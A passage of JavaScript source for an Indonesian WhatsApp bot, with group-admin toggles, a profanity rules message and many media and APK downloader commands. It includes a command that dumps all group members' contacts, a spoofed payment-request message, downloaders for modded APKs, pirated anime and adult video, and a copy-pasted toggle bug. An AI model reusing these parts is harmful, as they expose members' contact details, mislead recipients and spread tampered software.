if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (args[0] == 'enable'){
if (chats.antipromosi) return reply('UDAH ON!')
chats.antipromosi = true
reply('Fitur anti promosi telah di aktifkan')
} else if (args[0] == 'disable'){
if (!chats.antipromosi) return reply('UDAH OFF!')
chats.antipromosi = false
reply('Fitur anti promosi telah di matikan')
} else reply('enable / disable')
break 
case 'antilinkhttps':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (args[0] == 'enable'){
if (chats.antipromosi) return reply('UDAH ON!')
chats.antipromosi = true
reply('Fitur anti promosi telah di aktifkan')
} else if (args[0] == 'disable'){
if (!chats.antipromosi) return reply('UDAH OFF!')
chats.antipromosi = false
reply('Fitur anti promosi telah di matikan')
} else reply('enable / disable')
break 
case 'larangan': case 'peraturan': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
await loading()
 if (!m.isGroup) return reply2(mess.group)
RezzHost.sendMessage(from, { text : `Haii 👋 Aku ${botname}
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst` , mentions: participants.map(a => a.id)}, {quoted:kalgans})
}
break
case 'friend': case 'searchfriend':{
if (!isCreator) return reply('kusus Creator')
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
reply(mess.search)
}, 1000)
setTimeout(() => {
reply('Managed to Get One Person')
}, 5000)
setTimeout(() => {
RezzHost.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : kalgans })
}, 9000)
}
break
case 'react': {
                if (!isCreator) return reply('kusus owner')
               let reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: false, id: quoted.id }
                    }
                }
                RezzHost.sendMessage(m.chat, reactionMessage)
            }
            break
case 'join': {
if (!isCreator) return reply2(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await RezzHost.groupAcceptInvite(result).then((res) => reply2(jsonformat(res))).catch((err) => reply2(jsonformat(err)))
}
break
case 'getcontact': case 'getkontak':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
huhuhs = await RezzHost.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: kalgans, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
RezzHost.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'getidgc':
case 'getid':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

// BATAS GROUPMENU


// Downloadmenu


case 'douyinmp3': {
if (!args[0]) return reply(` ${prefix +command} https://v.douyin.com/iRKrcfea`)
         if (!args[0].match(/(https:\/\/v.douyin.com\/)/gi)) return reply(mess.erorrF)
         m.reply(mess.getdata)
         let ini = require('./lib/scrape/douyin')
         let old = new Date()
         let json = await ini.douyin(args[0])
         let text = `乂  *D O U Y I N*\n\n`
         text += `*Title* : ${json.info_video.title}\n`
         text += `*Duration* : ${json.info_video.duration}\n\n`
         text += global.footer
         RezzHost.sendFile(m.chat, json.media['128kbps'].url, 'audio.mp3', '', m)
}
break
case 'douyin': {
if (!args[0]) return reply(` ${prefix +command} https://v.douyin.com/iRKrcfea`)
         if (!args[0].match(/(https:\/\/v.douyin.com\/)/gi)) return reply(mess.erorrF)
         m.reply(mess.getdata)
         let ini = require('./lib/scrape/douyin')
         let old = new Date()
         let json = await ini.douyin(args[0])
         let text = `乂  *D O U Y I N*\n\n`
         text += `*Title* : ${json.info_video.title}\n`
         text += `*Duration* : ${json.info_video.duration}\n\n`
         text += global.footer
         RezzHost.sendFile(m.chat, json.media.hd.url, '', text, kalgans)
}
break
case 'android1dl': {
if (!text) return reply(`mana link nya kak`)
reply(mess.getdata)
let an = await fetchJson(`https://api.neoxr.my.id/api/an1-get?url=${text}&apikey=${ApiNx}`)
let teks = `A N D R O I D 1 - D O W N L O A D E R

     ◦‎  *Name* : ${an.data.name}
     ◦‎  *Requirement* : ${an.data.requirement}
     ◦‎  *Version* : ${an.data.version}
     ◦‎  *Size* : ${an.data.size}
     ◦‎  *Rating* : ${an.data.rating}
     ◦‎  *Published* : ${an.data.published}
     ◦‎  *Installed* : ${an.data.installed}
     ◦‎  *Rate* : ${an.data.rated}
     ◦‎  *Description* : ${an.data.description}
     
     
${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `A N D R O I D 1`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document: { url: an.data.url }, fileName: `${an.data.name}.apk`, mimetype: 'application/package' }, { quoted: kalgans })
}
break
case 'android1':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} racing`)
reply(mess.search)
let anu = await fetchJson(`https://api.neoxr.my.id/api/an1?q=${text}&apikey=${ApiNx}`)
let teks = `乂 *A N D R O I D 1 - S E A R C H*\n\n`
anu.data.map((v, i) => {
teks += `${i+1}. \n`
teks += `*Title* : ${v.name}\n`
teks += `*Dev* : ${v.developer}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case '9appsdl': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} https://9apps.com/android-apps/Luky-Patcher`)
reply(mess.getdata)
let anu = await fetchJson(`https://api.alyachan.dev/api/apkget?url=${text}&apikey=${alya}`)
let app = anu.data
let txt = `乂 *9 A P P S - D O W N L O A D*

   ◦  *Name* : ${app.name}
   ◦  *Id* : ${app.id}
   ◦  *Size* : ${app.size}
   ◦  *Rating* : ${app.rating}
   ◦  *Update* : ${app.update}
   ◦  *Version* : ${app.version}
   ◦  *Download* : ${app.download}
   ◦  *Category* : ${app.category}

  
${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${app.name}`,
body: '',
thumbnailUrl: app.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : app.url }, fileName : `${app.name}.apk`, mimetype: 'application/package' }, { quoted : kalgans })
}
break
case 'playstoredl': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} link`)
reply(mess.getdata)
let anu = await fetchJson(`https://api.alyachan.dev/api/playstore-get?url=${text}&apikey=${alya}`)
let app = anu.data
let txt = `乂 *P L A Y S T O R E - D O W N L O A D*

   ◦  *Name* : ${app.title}
   ◦  *Package* : ${app.packageName}
   ◦  *UploadDate* : ${app.uploadDate}
   ◦  *Version* : ${app.versionString}
   ◦  *Downloads* : ${app.downloads}
  
${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${app.title}`,
body: '',
thumbnailUrl: app.media.icon.imageUrl,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : app.lastVersion.deliveryData.downloadUrl }, fileName : `${app.title}.apk`, mimetype: 'application/package' }, { quoted : fverif })
}
break
case 'spotifylist':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} https://open.spotify.com/playlist/4hxAn5CwNbJHe5sh8cTF7i?si=GFx87Be8SP2NpDQklgBFMA`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/download/spotifylist?apikey=${xfarApi}&url=${text}`)
let teks = `乂 *S P O T I F Y - L I S T*\n\n`
teks += `Total : ${anu.result.total}\n`
teks += `PlayList : ${anu.result.playlist}\n`
teks += `Followers : ${anu.result.followers}\n`
teks += `Collabolator : ${anu.result.collabolator}\n\n`
teks += `*LIST* :\n\n`
anu.result.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.name}\n`
teks += `*Link* : ${v.tracks}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `S P O T I F Y - P L A Y L I S T`,
body: '',
thumbnailUrl: anu.result.cover_url,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'googlepod': case 'googlepodcast': {
if (!text) return reply(`Example : ${prefix + command} https://m.soundcloud.com/atlanticrecords/james-arthur-anne-marie-rewrite-the-stars`)
reply(mess.search)
let sc = await fetchJson(`https://api.xfarr.com/api/download/googlepodcast?apikey=${xfarApi}&url=${text}`)
let teks = `乂 G O G L E - P O D C A S T\n\n`
teks += `   ◦  Title : ${sc.result.title}\n`
teks += `   ◦  Author : ${sc.result.author}\n`
teks += `   ◦  Upload : ${sc.result.upload}\n`
teks += `   ◦  Description : ${sc.result.description}\n\n`
teks += global.footer
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 ${sc.result.title}`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { audio: { url: sc.result.url }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'apkfab': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} https://apkfab.com/whatsapp-messenger/com.whatsapp`)
reply(mess.search)
let anu = await fetchJson(`https://vihangayt.me/download/apkfab?url=${text}`)
let txt = `乂 *A P K  F A B - D O W N L O A D*

   ◦  *Name* : ${anu.data.title}
   ◦  *Size* : ${anu.data.size}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `A P K  F A B`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : anu.data.link }, fileName : `${anu.data.title}.apk`, mimetype: 'application/package' }, { quoted : kalgans })
}
break
case 'apkfabsearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} whatsapp`)
reply(mess.search)
let anu = await fetchJson(`https://vihangayt.me/search/apkfab?q=${text}`)
let teks = `乂 *A P K  F A B - S E A R C H*\n\n`
anu.data.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Review* : ${v.review}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
await RezzHost.sendMessage(m.chat, { image: { url: anu.data[0].image }, caption: teks }, { quoted: kalgans })
}
break
case 'playmodsdl': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} https://m.playmods.net/id/apps/whatsapp-messenger/com.whatsapp`)
reply(mess.search)
let anu = await chApi.getApp(text)
let txt = `乂 *P L A Y M O D S - D O W N L O A D*

   ◦  *Name* : ${anu.title}
   ◦  *Size* : ${anu.size}
   ◦  *Score* : ${anu.score}
   ◦  *Edisi* : ${anu.edisi}
   ◦  *Created* : ${anu.create}
   ◦  *Detail* : ${anu.detail}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `P L A Y M O D S`,
body: '',
thumbnailUrl: anu.image,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : anu.link }, fileName : `${anu.title}.apk`, mimetype: 'application/package' }, { quoted : kalgans })
}
break
case 'playmods':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Whatsapp`)
reply(mess.search)
let anu = await chApi.searchApp(text)
let teks = `乂 *P L A Y M O D S - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}. *Name* : ${v.title}\n`
teks += `Menu : ${v.menu}\n`
teks += `Detail : ${v.detail}\n`
teks += `Link : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 P L A Y - M O D S`,
body: '',
thumbnailUrl: anu[0].image,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'apkmirror': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.apkmirror.com/apk/spotify-ltd/anchor/anchor-4-34-0-release/`)
if (!isUrl(args[0]) && !args[0].includes('https://')) throw `The link you provided is invalid`
reply(mess.search)
const baby1 = await chApi.getApkmirror(text)
result4 = `乂 *APK MIRROR DOWNLOADER*

   ◦  *Name* : ${baby1.title}
   ◦  *Author* : ${baby1.author}
   ◦  *Description* : ${baby1.description}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: result4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `A P K M I R R O R`,
body: '',
thumbnailUrl: baby1.gambar,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : baby1.linkdl }, fileName : `${baby1.title}.apk`, mimetype: 'application/package' }, { quoted : kalgans })
}
break
case 'moewalls': {
if (!text) throw 'what do you want to find ?'
reply(mess.wait)
try {
let txt = ''
if (isUrl(text)) {
let anu = await moewallsUrl(text)
for (let x of Object.keys(anu).filter(v => !/prev/.test(v))) {
txt += `\n*${x} :* ${anu[x]}`
}
await RezzHost.sendMessage(m.chat, { video: { url : anu.preview }, caption: txt }, { quoted: kalgans })
} else {
let anu = await moewallsSearch(text)
let txt = `乂 M O E W A L L S - S E A R C H\n\n`
anu.map((v, i) => {
txt += `${i+1}. *title :* ${v.title}\n`
txt += `*url :* ${v.url}\n\n───────────────────\n\n`
}).join('\n\n')
await RezzHost.sendMessage(m.chat, { image: { url: anu[0].thumb }, caption: txt }, { quoted: kalgans })
}
} catch (error) {
console.error(error);
reply(`Failed to progresing. Please try again later: ${error}`);
}
}
break
case 'jooxdl': {
if (!text) return reply(`Example : ${prefix + command} 842NlZjc2r8yMBy9xZqXgA==`)
reply(mess.search)
let scn = await fetchJson(`https://api.alyachan.dev/api/joox-get?id=${text}&apikey=${alya}`)
let sc = scn.data
let sklod = `乂 J O O X - P L A Y\n\n`
sklod += `Name : ${sc.name}\n`
sklod += `Artist : ${sc.artist}\n`
sklod += `Duration : ${sc.duration}\n`
sklod += `Album : ${sc.album}\n`
sklod += `Genre : ${sc.genre}\n`
sklod += `Country : ${sc.country}\n`
sklod += `Date : ${sc.release}\n`
sklod += `Url : ${sc.uri}\n\n`
sklod += `${footer}`
RezzHost.sendMessage(m.chat, {
text: sklod,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 J O O X - D O W N L O A D`,
body: '',
thumbnailUrl: sc.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
await RezzHost.sendMessage(m.chat, { audio: { url: sc.download }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'apk': {
if (args.length == 0) return reply(`masukan id package`)
reply(mess.getdata)
const baby1 = await apkDl.download(text)
result4 = `乂 *APK DOWNLOADER*

   ◦  *Name* : ${baby1.name}
   ◦  *Lastup* : ${baby1.lastup}
   ◦  *Package* : ${baby1.package}
   ◦  *Size* : ${baby1.size}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: result4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `A P K - D O W N L O A D`,
body: '',
thumbnailUrl: baby1.icon,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : baby1.dllink }, fileName : `${baby1.data.name}.apk`, mimetype: 'application/package' }, { quoted : kalgans })
}
break
case 'devianartdl':{
if (!isCreator) reply('mana text nya')
reply(mess.search)
anu = await fetchJson(`https://api.xfarr.com/api/download/deviantart?apikey=${xfarApi}&url=${text}`)
RezzHost.sendMessage(m.chat, { image: { url: anu.result.image }, caption: `Source: ${anu.result.source}` }, { quoted: kalgans })
}
break
case 'devianart': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let old = new Date()
const json = await fetchJson(`https://api.xfarr.com/api/search/deviantart?apikey=${xfarApi}&query=${text}`)
for (let i = 0; i < 3; i++) {
var rand = Math.floor(json.result.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: json.result[rand].image }, caption: `*Source* : ${json.result[rand].source}\n\n🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'pixeldrain': {
if (args.length == 0) return reply(`Mana Link Nya ?`)
if (!isUrl(args[0]) && !args[0].includes('https://')) throw `The link you provided is invalid`
reply(mess.search)
const baby2 = await fetchJson(`https://api.xfarr.com/api/download/pixeldrain?apikey=${xfarApi}&url=${text}`)
baby1 = baby2.result
result4 = `乂 *PIXELDRAIN DOWNLOADER*

   ◦  *Id* : ${baby1.Id}
   ◦  *Size* : ${baby1.sizeH}
   ◦  *type* : ${baby1.mimetype}
   ◦  *Url* : ${baby1.url}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: result4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `P I X E L D R A I N`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { video : { url : baby1.url}, mimetype: baby1.mimetype }, { quoted : kalgans })
}
break
case 'bandcampdl': {
if (!text) return reply(`Example : ${prefix + command} https://riverwestin.bandcamp.com/track/old-love?search_item_id=2579997523&search_item_type=t&search_match_part=%3F&search_page_id=2961892808&search_page_no=0&search_rank=48`)
reply(mess.search)
let sc = await fetchJson(`https://api.xfarr.com/api/download/bandcamp?apikey=${xfarApi}&url=${text}`)
let sklod = `乂 BandCamp Download\n\n`
sklod += `Id : ${sc.result.id}\n`
sklod += `Title : ${sc.result.title}\n`
sklod += `Duration : ${sc.result.duration}\n\n`
sklod += `*Lyrics* :\n`
sklod += `${sc.result.lyrics}\n\n`
sklod += `${footer}`
RezzHost.sendMessage(m.chat, {
text: sklod,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 B A N D C A M P`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
await RezzHost.sendMessage(m.chat, { audio: { url: sc.result.mp3 }, mimetype: 'audio/mp4'}, { quoted: kalgans })
}
break
case 'bandcamp':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} old love`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/search/bandcamp?apikey=${xfarApi}&query=${text}`)
let teks = `乂 *B A N D C A M P - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *title* : ${v.title}\n`
teks += `*BandId* : ${v.bandId}\n`
teks += `*BandName* : ${v.bandName}\n`
teks += `*Album* : ${v.albumName}\n`
teks += `*AlbumId* : ${v.albumId}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'snaptik': {
if (!text) return reply(`Mana Link Nya`)
reply(mess.getdata)
let timestamp = speed()
let latensi = speed() - timestamp
let anu = await fetchJson(`https://api.yanzbotz.my.id/api/downloader/snaptik?url=${text}&apiKey=${yanzApi}`)
RezzHost.sendMessage(m.chat, { video: { url: anu.result.serverHD.url }, caption: `*[ S N A P T I K - D O W N L O A D E R ]*\nCaption : ${anu.result.caption}\n\n🍟 *Fetching* : ${latensi.toFixed(4)} ms` }, { quoted: kalgans })
}
break
case 'threadsimg': {
if (!args || !args[0]) return reply(`Example: ${prefix + command} https://www.threads.net/t/Cujx6ryoYx6/?igshid=NTc4MTIwNjQ2YQ==`)
await loading()
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://aemt.me/download/threads?url=${text}`)
RezzHost.sendMessage(m.chat, { image: { url: json.result.image_urls }, caption: mess.done }, { quoted: kalgans })
}
break
case 'threads2': {
if (!args || !args[0]) return reply(`Example: ${prefix + command} https://www.threads.net/@httpnald_/post/CwWvCFvJr_N/?igshid=NTc4MTIwNjQ2YQ==`)
await loading()
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://dikaardnt.com/api/download/threads?url=${text}`)
RezzHost.sendMessage(m.chat, { video: { url: json.urls[0].url }, caption: mess.done }, { quoted: kalgans })
}
break
case 'threads': {
if (!args || !args[0]) return reply(`Example: ${prefix + command} https://www.threads.net/@httpnald_/post/CwWvCFvJr_N/?igshid=NTc4MTIwNjQ2YQ==`)
reply(mess.wait)
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://aemt.me/download/threads?url=${text}`)
RezzHost.sendMessage(m.chat, { video: { url: json.result.video_urls[0].download_url }, caption: `🍟 *Fetching* : ${latensi.toFixed(4)} ms` }, { quoted: kalgans })
}
break
case 'krakendl': {
if (args.length == 0) return reply(`Mana Link Nya ?`)
if (!isUrl(args[0]) && !args[0].includes('https://')) throw `The link you provided is invalid`
reply(mess.search)
const baby2 = await fetchJson(`https://api.xfarr.com/api/download/kraken?apikey=${xfarApi}&url=${text}`)
baby1 = baby2.result
result4 = `乂 *KRAKENFILES DOWNLOADER*

   ◦  *Name* : ${baby1.fileName}
   ◦  *Upload* : ${baby1.uploadDate}
   ◦  *Size* : ${baby1.fileSize}
   ◦  *type* : ${baby1.type}
   ◦  *Views* : ${baby1.views}
   ◦  *Url* : ${baby1.url}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: result4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `K R A K E N F I L E S`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { video : { url : baby1.url}, fileName : baby1.fileName }, { quoted : kalgans })
}
break
case 'kusonimeget': {
try {
if (!args || !args[0]) return reply(`Eample: ${prefix + command} https://kusonime.com/one-piece-episode-0001-1075-batch-subtitle-indonesia/`)
if (!args[0].match(/(https:\/\/kusonime.com\/)/gi)) return reply(`Masukan link Kusonime`)
reply(mess.search)
let json = await chApi.kusonimeget(args[0])
let text = `乂  *K U S O N I M E  - G E T*\n\n`
text += `	◦  *Japanese :*  ${json.Japanese}\n`
text += `	◦  *Genre :*  ${json.Genre}\n`
text += `	◦  *Seasons :*  ${json.Seasons}\n`
text += `	◦  *Producers :*  ${json.Producers}\n`
text += `	◦  *Type :*  ${json.Type}\n`
text += `	◦  *Status :*  ${json.Status}\n`
text += `	◦  *Total_Episode :*  ${json.Total_Episode}\n`
text += `	◦  *Score :*  ${json.Score}\n`
text += `	◦  *Duration :*  ${json.Duration}\n`
text += `	◦  *Released_on :*  ${json.Released_on}\n\n`  
for(let v of json.download) {
text += `• Episode: ${v.resolution}\n`
for(let w of json.download) {
text += `• Link: ${w.link}\n\n`
}   
}
text += `${footer}` 
RezzHost.sendMessage(m.chat, {
text: text,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 K U S O N I M E - G E T`,
body: '',
thumbnailUrl: json.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} catch (e) {
console.log(e)
return reply(mess.error)
}
}
break
case 'megadl': {
if (!text) return reply(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
reply(mess.search)
let download = `https://api.xfarr.com/api/download/mega?apikey=${xfarApi}&url=${text}`
RezzHost.sendMessage(m.chat, { document: { url: download }, fileName: 'megadl by kayy', mimetype: 'application/zip' }, { quoted: m })
}
break
case 'zippy': {
if (!args[0]) throw `Uhm...url nya mana?\n\nContoh:\n${prefix + command} https://www4.zippyshare.com/v/uBGCbNHt/file.html`
reply(mess.search)
let res = await zsExtract.extract(args[0])
let { download, filename } = res
reply('Mohon tunggu selama *5 menit* sedang mendownload file dari _zippyshare_\n\nMinimal File *100MB* jika lebih dari yang ditentukan, Dann-MD tidak akan mengirimkan file..!!')
 RezzHost.sendFile(m.chat, download, filename, filename, m)
}
break
case 'igstory': {
if (!text) return reply(`[ Example ] .${command} raffa_and`)
reply(mess.search)
let timestamp = speed()
let latensi = speed() - timestamp
var asupan = await fetchJson(`https://api.lolhuman.xyz/api/igstory/${text}?apikey=${apikey}`)
for (let i = 0; i < asupan.result.length; i++) {
RezzHost.sendMessage(m.chat, { video: { url: asupan.result[i] }, caption: `🍟 *Fetching* : ${latensi.toFixed(4)} ms\n\n${footer}`}, { quoted: kalgans })
await sleep(1500)
}
}
break
case 'xvideodl':{
if (!isCreator) return reply(mess.owner)    
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝘂𝗿𝗹`)
reply(mess.search)
let anu = await dylux.xvideosdl(text)
tks = `乂 X V I D E O S - D L\n\n   ◦  Judul : ${anu.title}\n   ◦  Views : ${anu.views}\n   ◦  Likes : ${anu.likes}\n   ◦  Size : ${anu.size}\n\n${footer}`
RezzHost.sendMessage(m.chat, { video: { url: anu.url_dl }, caption: tks}, {quoted: kalgans})
}
break
case 'xvideosearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let json = await dylux.xvideosSearch(text)
let teks = `乂 *X V I D E O S - S E A R C H*\n\n`
json.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Durasi* : ${v.duration}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'sharechat': {
if (!text) return reply2(`[ ! ] *example:* ${prefix + command} https://sharechat.com/video/pDExqga`)
if (!(text.includes('http://') || text.includes('https://'))) return reply2(`url invalid, please input a valid url. Try with add http:// or https://`)
if (!text.includes('sharechat.com')) return reply2(`Invalid Sharechat URL.`)
reply2(mess.search)
try {
let anun = await fetchJson(`https://api.lolhuman.xyz/api/sharechat?apikey=${apikey}&url=${text}`)
anu = anun.result
await RezzHost.sendMessage(m.chat, { video: { url: anu.link_dl }, caption: `乂 S H A R E C H A T - D L\n\n   ◦  *Title* : ${anu.title}\n\n${footer}` }, { quoted: kalgans })
} catch (e) {
console.log(e)
throw 'Internal server error.'
}
}
break
case 'unsplash': {
if (!text) return reply(`[ ! ] *example:* ${prefix + command} mountain`)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/unsplash?apikey=${apikey}&query=${text}`)
reply(mess.search)
for (let x of anu.result) {
await RezzHost.sendMessage(m.chat, { image: { url: x }, caption: `${anu.result.length} Image By Unsplash` }, { quoted : kalgans })
await sleep(1500)
}
}
break
case 'imgur': {
if (!/https:\/\/imgur\.com\/gallery\//i.test(m.text)) return m.reply(`Example : ${prefix + command} https://imgur.com/gallery/ksnRO`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/download/imgur?apikey=${xfarApi}&url=${text}`)
if (anu.result.video) {
RezzHost.sendMessage(m.chat,{video:{url: anu.result.video },caption: 'Done!!!'},{quoted:kalgans})
} else {
await RezzHost.sendMessage(m.chat, { image: { url: anu.result.image }}, { quoted: kalgans });
}
}
break
case 'capcut2': {
if (!args[0]) return reply(`Masukan Url Capcut!\n\nContoh:\n${prefix + command} https://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
if (!/www.capcut/i.test(args[0])) return reply('Invalid Url!')
reply(mess.search)
let cpct = await fetchJson(`https://tools.betabotz.org/tools/capcutdl?url=${text}`)
txtc = `乂 C A P C U T - D O W N L O A D E R

   ◦  *Title* : ${cpct.result.title}
   ◦  *Description* : ${cpct.result.description}
   
${footer}`
RezzHost.sendMessage(from, { video: { url: cpct.result.video_ori }, mimetype: 'video/mp4', caption: txtc }, { quoted:kalgans })
}
break
case 'getweb': {
if (!text) return reply('Mana Link Nya')
reply(mess.search)
let anu = await fetchJson(`https://api.caliph.biz.id/api/tools/pagelinks?url=${text}&apikey=${caliph}`)
RezzHost.sendMessage(m.chat, { document : { url : anu.data }, fileName : `${text}`, mimetype: 'application/zip' }, { quoted : kalgans })
}
break
case 'pixiv':{
if (!text) return reply('Query??')
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/pixiv?apikey=${apikey}&query=${text}`)
for (let i = 0; i < 5; i++) {
result = anu.result[Math.floor(Math.random() * anu.result.length)]   
